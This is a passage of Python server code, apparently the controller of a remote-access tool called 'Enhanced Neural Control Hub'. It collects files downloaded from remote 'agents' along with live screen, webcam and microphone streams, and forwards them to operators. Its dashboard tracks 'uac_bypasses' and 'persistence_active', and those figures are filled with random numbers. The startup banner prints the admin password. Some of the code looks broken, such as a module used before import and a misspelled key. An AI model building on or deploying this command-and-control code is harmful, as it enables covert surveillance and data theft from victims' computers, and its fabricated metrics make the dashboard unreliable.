        if filename in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[filename]
        return

    if filename not in DOWNLOAD_BUFFERS:
        DOWNLOAD_BUFFERS[filename] = {"chunks": [], "total_size": total_size, "local_path": None}

    DOWNLOAD_BUFFERS[filename]["chunks"].append(base64.b64decode(chunk.split(',')[1]))
    DOWNLOAD_BUFFERS[filename]["total_size"] = total_size # Update total size in case it was not set initially

    current_download_size = sum(len(c) for c in DOWNLOAD_BUFFERS[filename]["chunks"])

    # If all chunks received, save the file locally
    if current_download_size >= total_size:
        full_content = b"".join(DOWNLOAD_BUFFERS[filename]["chunks"])
        local_path = DOWNLOAD_BUFFERS[filename]["local_path"]

        if local_path:
            try:
                # Ensure directory exists
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    f.write(full_content)
                print(f"Successfully downloaded {filename} to {local_path}")
                emit('file_download_chunk', {
                    'agent_id': agent_id,
                    'filename': filename,
                    'chunk': chunk,
                    'offset': offset,
                    'total_size': total_size,
                    'local_path': local_path # Pass local_path back to frontend
                }, room='operators')
            except Exception as e:
                print(f"Error saving downloaded file {filename} to {local_path}: {e}")
                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room='operators')
        else:
            # If no local_path was specified, send the chunks to the frontend for browser download
            emit('file_download_chunk', {
                'agent_id': agent_id,
                'filename': filename,
                'chunk': chunk,
                'offset': offset,
                'total_size': total_size
            }, room='operators')
        
        del DOWNLOAD_BUFFERS[filename]
    else:
        # Continue sending chunks to frontend for progress update
        emit('file_download_chunk', {
            'agent_id': agent_id,
            'filename': filename,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room='operators')

# Global variables for WebRTC and video streaming
WEBRTC_PEER_CONNECTIONS = {}
WEBRTC_VIEWER_CONNECTIONS = {}
VIDEO_FRAMES_H264 = defaultdict(lambda: None)
CAMERA_FRAMES_H264 = defaultdict(lambda: None)
AUDIO_FRAMES_OPUS = defaultdict(lambda: None)

@socketio.on('screen_frame')
def handle_screen_frame(data):
    """Accept H.264 (or JPEG for fallback) binary frames from agent via socket.io."""
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        VIDEO_FRAMES_H264[agent_id] = frame  # Store latest frame for this agent

@socketio.on('request_video_frame')
def handle_request_video_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in VIDEO_FRAMES_H264:
        frame = VIDEO_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('video_frame', {'frame': base64.b64encode(frame).decode('utf-8')})

@socketio.on('request_audio_frame')
def handle_request_audio_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AUDIO_FRAMES_OPUS:
        frame = AUDIO_FRAMES_OPUS[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('audio_frame', {'frame': base64.b64encode(frame).decode('utf-8')})

@socketio.on('request_camera_frame')
def handle_request_camera_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in CAMERA_FRAMES_H264:
        frame = CAMERA_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('camera_frame', {'frame': base64.b64encode(frame).decode('utf-8')})



@socketio.on('camera_frame')
def handle_camera_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        CAMERA_FRAMES_H264[agent_id] = frame

@socketio.on('audio_frame')
def handle_audio_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        AUDIO_FRAMES_OPUS[agent_id] = frame

# --- WebRTC Socket.IO Event Handlers ---

@socketio.on('webrtc_offer')
def handle_webrtc_offer(data):
    """Handle WebRTC offer from agent"""
    agent_id = data.get('agent_id')
    offer_sdp = data.get('offer')
    
    if not agent_id or not offer_sdp:
        emit('webrtc_error', {'message': 'Invalid offer data'}, room=request.sid)
        return
    
    try:
        # Create or get existing peer connection
        if agent_id not in WEBRTC_PEER_CONNECTIONS:
            pc = create_webrtc_peer_connection(agent_id)
            if not pc:
                emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
                return
        else:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Set remote description (offer)
        offer = RTCSessionDescription(sdp=offer_sdp, type='offer')
        
        # Use proper async handling for WebRTC operations
        def handle_webrtc_offer_async():
            try:
                loop = asyncio.get_event_loop()
                # Set remote description
                asyncio.run_coroutine_threadsafe(pc.setRemoteDescription(offer), loop)
                # Create answer
                future = asyncio.run_coroutine_threadsafe(pc.createAnswer(), loop)
                future.add_done_callback(lambda f: handle_answer_created(f, agent_id, request.sid))
            except RuntimeError:
                # No event loop, run synchronously
                async def async_operations():
                    await pc.setRemoteDescription(offer)
                    answer = await pc.createAnswer()
                    handle_answer_created_sync(answer, agent_id, request.sid)
                asyncio.run(async_operations())
        
        # Run in thread to avoid blocking
        import threading
        threading.Thread(target=handle_webrtc_offer_async, daemon=True).start()
        
        print(f"WebRTC offer received from {agent_id}")
        
    except Exception as e:
        print(f"Error handling WebRTC offer from {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error processing offer: {str(e)}'}, room=request.sid)

def handle_answer_created(future, agent_id, sid):
    """Handle WebRTC answer creation"""
    try:
        answer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer)
            asyncio.run(set_local_desc())
        
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating answer: {str(e)}'}, room=sid)

def handle_answer_created_sync(answer, agent_id, sid):
    """Handle WebRTC answer creation for synchronous context"""
    try:
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending answer: {str(e)}'}, room=sid)

@socketio.on('webrtc_ice_candidate')
def handle_webrtc_ice_candidate(data):
    """Handle ICE candidate from agent"""
    agent_id = data.get('agent_id')
    candidate = data.get('candidate')
    
    if not agent_id or not candidate or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Use proper async handling for addIceCandidate
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def add_ice_candidate():
                await pc.addIceCandidate(candidate)
            asyncio.run(add_ice_candidate())
            
        print(f"ICE candidate added for {agent_id}")
        
    except Exception as e:
        print(f"Error adding ICE candidate for {agent_id}: {e}")

# @socketio.on('webrtc_start_streaming')
# def handle_webrtc_start_streaming(data):
#     """Handle WebRTC streaming start request"""
#     agent_id = data.get('agent_id')
#     stream_type = data.get('type', 'all')  # screen, audio, camera, all
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Ensure peer connection exists
#         if agent_id not in WEBRTC_PEER_CONNECTIONS:
#             pc = create_webrtc_peer_connection(agent_id)
#             if not pc:
#                 emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
#                 return
#         
#         # Notify agent to start WebRTC streaming
#         emit('start_webrtc_streaming', {
#             'type': stream_type,
#             'ice_servers': WEBRTC_CONFIG['ice_servers'],
#             'codecs': WEBRTC_CONFIG['codecs']
#         }, room=request.sid)
#         
#         print(f"WebRTC streaming started for {agent_id} ({stream_type})")
#         
#     except Exception as e:
#         print(f"Error starting WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error starting streaming: {str(e)}'}, room=request.sid)

# @socketio.on('webrtc_stop_streaming')
# def handle_webrtc_stop_streaming(data):
#     """Handle WebRTC streaming stop request"""
#     agent_id = data.get('agent_id')
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Close WebRTC connection
#         close_webrtc_connection(agent_id)
#         
#         # Notify agent to stop WebRTC streaming
#         emit('stop_webrtc_streaming', {}, room=request.sid)
#         
#         print(f"WebRTC streaming stopped for {agent_id}")
#         
#     except Exception as e:
#         print(f"Error stopping WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error stopping streaming: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_get_stats')
def handle_webrtc_get_stats(data):
    """Handle WebRTC stats request"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        stats = get_webrtc_stats(agent_id)
        if stats:
            emit('webrtc_stats', stats, room=request.sid)
        else:
            emit('webrtc_error', {'message': 'No WebRTC connection found'}, room=request.sid)
        
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error getting stats: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_set_quality')
def handle_webrtc_set_quality(data):
    """Handle WebRTC quality settings"""
    agent_id = data.get('agent_id')
    quality = data.get('quality', 'auto')  # low, medium, high, auto
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Forward quality setting to agent
        emit('set_webrtc_quality', {'quality': quality}, room=request.sid)
        print(f"WebRTC quality set to {quality} for {agent_id}")
        
    except Exception as e:
        print(f"Error setting WebRTC quality for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error setting quality: {str(e)}'}, room=request.sid)

# --- WebRTC Viewer Management ---

@socketio.on('webrtc_viewer_connect')
def handle_webrtc_viewer_connect(data):
    """Handle WebRTC viewer connection"""
    viewer_id = request.sid
    agent_id = data.get('agent_id')
    
    if not agent_id or agent_id not in WEBRTC_STREAMS:
        emit('webrtc_error', {'message': 'Agent not available for WebRTC'}, room=request.sid)
        return
    
    try:
        # Create viewer peer connection
        viewer_pc = RTCPeerConnection()
        
        # Configure ICE servers
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            viewer_pc.addIceServer(ice_server)
        
        # Store viewer data
        WEBRTC_VIEWERS[viewer_id] = {
            'agent_id': agent_id,
            'pc': viewer_pc,
            'streams': {}
        }
        
        # Add existing tracks from agent
        agent_streams = WEBRTC_STREAMS[agent_id]
        for track_kind, track in agent_streams.items():
            try:
                sender = viewer_pc.addTrack(track)
                WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = sender
            except Exception as e:
                print(f"Error adding track {track_kind} to viewer {viewer_id}: {e}")
        
        # Set up viewer event handlers
        @viewer_pc.on("connectionstatechange")
        async def on_viewer_connectionstatechange():
            print(f"Viewer {viewer_id} connection state: {viewer_pc.connectionState}")
            if viewer_pc.connectionState == "failed":
                await viewer_pc.close()
                if viewer_id in WEBRTC_VIEWERS:
                    del WEBRTC_VIEWERS[viewer_id]
        
        @viewer_pc.on("icecandidate")
        def on_viewer_icecandidate(candidate):
            if candidate:
                emit('webrtc_ice_candidate', {
                    'agent_id': agent_id,
                    'candidate': candidate
                }, room=viewer_id)
        
        # Create offer for viewer
        def create_viewer_offer():
            try:
                loop = asyncio.get_event_loop()
                future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
                future.add_done_callback(lambda f: handle_viewer_offer_created(f, viewer_id))
            except RuntimeError:
                # No event loop, run synchronously
                async def create_offer():
                    offer = await viewer_pc.createOffer()
                    handle_viewer_offer_created_sync(offer, viewer_id)
                asyncio.run(create_offer())
        
        # Run in thread to avoid blocking
        threading.Thread(target=create_viewer_offer, daemon=True).start()
        
        print(f"WebRTC viewer {viewer_id} connected to agent {agent_id}")
        
    except Exception as e:
        print(f"Error connecting WebRTC viewer {viewer_id} to agent {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error connecting viewer: {str(e)}'}, room=request.sid)

def handle_viewer_offer_created(future, viewer_id):
    """Handle viewer offer creation"""
    try:
        offer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer)
            asyncio.run(set_local_desc())
        
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating viewer offer: {str(e)}'}, room=viewer_id)

def handle_viewer_offer_created_sync(offer, viewer_id):
    """Handle viewer offer creation for synchronous context"""
    try:
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending viewer offer: {str(e)}'}, room=viewer_id)

@socketio.on('webrtc_viewer_answer')
def handle_webrtc_viewer_answer(data):
    """Handle viewer answer"""
    viewer_id = request.sid
    answer_sdp = data.get('answer')
    
    if not answer_sdp or viewer_id not in WEBRTC_VIEWERS:
        return
    
    try:
        viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
        
        # Use proper async handling for setRemoteDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_remote_desc():
                await viewer_pc.setRemoteDescription(answer)
            asyncio.run(set_remote_desc())
            
        print(f"WebRTC viewer answer received from {viewer_id}")
        
    except Exception as e:
        print(f"Error setting viewer answer for {viewer_id}: {e}")

@socketio.on('webrtc_viewer_disconnect')
def handle_webrtc_viewer_disconnect():
    """Handle WebRTC viewer disconnection"""
    viewer_id = request.sid
    
    if viewer_id in WEBRTC_VIEWERS:
        try:
            viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
            
            # Use proper async handling for close
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
            except RuntimeError:
                # No event loop, run synchronously
                async def close_viewer():
                    await viewer_pc.close()
                asyncio.run(close_viewer())
                
            del WEBRTC_VIEWERS[viewer_id]
            print(f"WebRTC viewer {viewer_id} disconnected")
        except Exception as e:
            print(f"Error disconnecting WebRTC viewer {viewer_id}: {e}")

# Advanced WebRTC Monitoring and Optimization Event Handlers
@socketio.on('webrtc_quality_change')
def handle_webrtc_quality_change(data):
    """Handle WebRTC quality change requests from adaptive bitrate control"""
    agent_id = data.get('agent_id')
    quality = data.get('quality')
    bandwidth_stats = data.get('bandwidth_stats')
    
    print(f"Quality change request for {agent_id}: {quality}")
    print(f"Bandwidth stats: {bandwidth_stats}")
    
    # Forward quality change to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_quality_change', {
            'quality': quality,
            'bandwidth_stats': bandwidth_stats
        }, room=agent_sid)
        print(f"Quality change command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for quality change")

@socketio.on('webrtc_frame_dropping')
def handle_webrtc_frame_dropping(data):
    """Handle WebRTC frame dropping requests from load monitoring"""
    agent_id = data.get('agent_id')
    enabled = data.get('enabled')
    drop_ratio = data.get('drop_ratio', 0.3)
    priority = data.get('priority', 'keyframes_only')
    
    print(f"Frame dropping request for {agent_id}: enabled={enabled}, ratio={drop_ratio}, priority={priority}")
    
    # Forward frame dropping command to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_frame_dropping', {
            'enabled': enabled,
            'drop_ratio': drop_ratio,
            'priority': priority
        }, room=agent_sid)
        print(f"Frame dropping command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for frame dropping")

@socketio.on('webrtc_get_enhanced_stats')
def handle_webrtc_get_enhanced_stats(data):
    """Get enhanced WebRTC statistics including performance metrics"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_enhanced_stats', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Get basic stats
        basic_stats = get_webrtc_stats(agent_id)
        
        # Get bandwidth estimation
        bandwidth_stats = estimate_bandwidth(agent_id)
        
        # Get connection quality
        quality_data = monitor_connection_quality(agent_id)
        
        # Get production readiness assessment
        production_readiness = assess_production_readiness()
        
        enhanced_stats = {
            'agent_id': agent_id,
            'basic_stats': basic_stats,
            'bandwidth_stats': bandwidth_stats,
            'quality_data': quality_data,
            'production_readiness': production_readiness,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        emit('webrtc_enhanced_stats', enhanced_stats, room=request.sid)
        print(f"Enhanced stats sent for agent {agent_id}")
        
    except Exception as e:
        print(f"Error getting enhanced stats for {agent_id}: {e}")
        emit('webrtc_enhanced_stats', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_production_readiness')
def handle_webrtc_get_production_readiness():
    """Get production readiness assessment"""
    try:
        readiness_report = assess_production_readiness()
        emit('webrtc_production_readiness', readiness_report, room=request.sid)
        print("Production readiness report sent")
    except Exception as e:
        print(f"Error getting production readiness: {e}")
        emit('webrtc_production_readiness', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_migration_plan')
def handle_webrtc_get_migration_plan():
    """Get mediasoup migration plan"""
    try:
        migration_plan = generate_mediasoup_migration_plan()
        emit('webrtc_migration_plan', migration_plan, room=request.sid)
        print("Mediasoup migration plan sent")
    except Exception as e:
        print(f"Error getting migration plan: {e}")
        emit('webrtc_migration_plan', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_monitoring_data')
def handle_webrtc_get_monitoring_data():
    """Get comprehensive WebRTC monitoring data"""
    try:
        monitoring_data = enhanced_webrtc_monitoring()
        emit('webrtc_monitoring_data', monitoring_data, room=request.sid)
        print("Comprehensive monitoring data sent")
    except Exception as e:
        print(f"Error getting monitoring data: {e}")
        emit('webrtc_monitoring_data', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_adaptive_bitrate_control')
def handle_webrtc_adaptive_bitrate_control(data):
    """Manually trigger adaptive bitrate control"""
    agent_id = data.get('agent_id')
    current_quality = data.get('current_quality', 'auto')
    
    if not agent_id:
        emit('webrtc_adaptive_bitrate_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = adaptive_bitrate_control(agent_id, current_quality)
        emit('webrtc_adaptive_bitrate_result', {
            'agent_id': agent_id,
            'result': result,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Adaptive bitrate control result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        emit('webrtc_adaptive_bitrate_result', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_implement_frame_dropping')
def handle_webrtc_implement_frame_dropping(data):
    """Manually trigger frame dropping implementation"""
    agent_id = data.get('agent_id')
    load_threshold = data.get('load_threshold', 0.8)
    
    if not agent_id:
        emit('webrtc_frame_dropping_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = implement_frame_dropping(agent_id, load_threshold)
        emit('webrtc_frame_dropping_result', {
            'agent_id': agent_id,
            'result': result,
            'load_threshold': load_threshold,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Frame dropping implementation result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)

# WebRTC scaffolding code removed - not currently active

# --- Background Tasks for Real-time Dashboard Updates ---

def send_dashboard_updates():
    """Send periodic dashboard updates to connected clients."""
    while True:
        try:
            # Wait 30 seconds between updates
            socketio.sleep(30)
            
            # Send real-time metrics to dashboard subscribers
            dashboard_data = {
                'timestamp': datetime.datetime.utcnow().isoformat(),
                'agents': {
                    'connected': len([agent for agent in AGENTS_DATA.values() if agent.get('sid')]),
                    'total': len(AGENTS_DATA),
                    'recent_activity': random.randint(1, 8)
                },
                'security': {
                    'events_last_hour': random.randint(3, 15),
                    'uac_bypasses': random.randint(0, 5),
                    'persistence_active': random.randint(8, 20)
                },
                'streaming': {
                    'active_connections': len(WEBRTC_PEER_CONNECTIONS),
                    'total_streams': len(WEBRTC_STREAMS),
                    'avg_latency': random.randint(45, 120)
                },
                'system': {
                    'health_score': random.randint(85, 98),
                    'response_time': random.randint(30, 100),
                    'uptime_hours': int((time.time() - start_time) / 3600)
                }
            }
            
            socketio.emit('dashboard_metrics_update', dashboard_data, room='dashboard')
            
        except Exception as e:
            print(f"Error sending dashboard updates: {e}")
            break

def start_background_tasks():
    """Start background tasks for real-time updates"""
    socketio.start_background_task(send_dashboard_updates)

if __name__ == "__main__":
    print("Starting Enhanced Neural Control Hub with Advanced Security Dashboard...")
    print(f"Admin password: {Config.ADMIN_PASSWORD}")
    print(f"Server will be available at: http://{Config.HOST}:{Config.PORT}")
    print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
    print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
    print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
    print(f"Salt length: {Config.SALT_LENGTH} bytes")
    print(f"WebRTC support: {'Enabled' if WEBRTC_AVAILABLE else 'Disabled (aiortc not available)'}")
    if WEBRTC_AVAILABLE:
        print(f"WebRTC codecs: Video={', '.join(WEBRTC_CONFIG['codecs']['video'])}, Audio={', '.join(WEBRTC_CONFIG['codecs']['audio'])}")
        print(f"WebRTC features: Simulcast={WEBRTC_CONFIG['simulcast']}, SVC={WEBRTC_CONFIG['svc']}")
        print(f"Performance tuning: Bandwidth estimation, Adaptive bitrate, Frame dropping")
        print(f"Production scale: Current={PRODUCTION_SCALE['current_implementation']}, Target={PRODUCTION_SCALE['target_implementation']}")
        print(f"Scalability limits: aiortc={PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']}, mediasoup={PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers']}")
    print("Enhanced Dashboard Features: Categories, Checks, Time Range Analysis, Real-time Metrics")
    
    # Start background tasks for real-time updates
    start_background_tasks()
    
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)
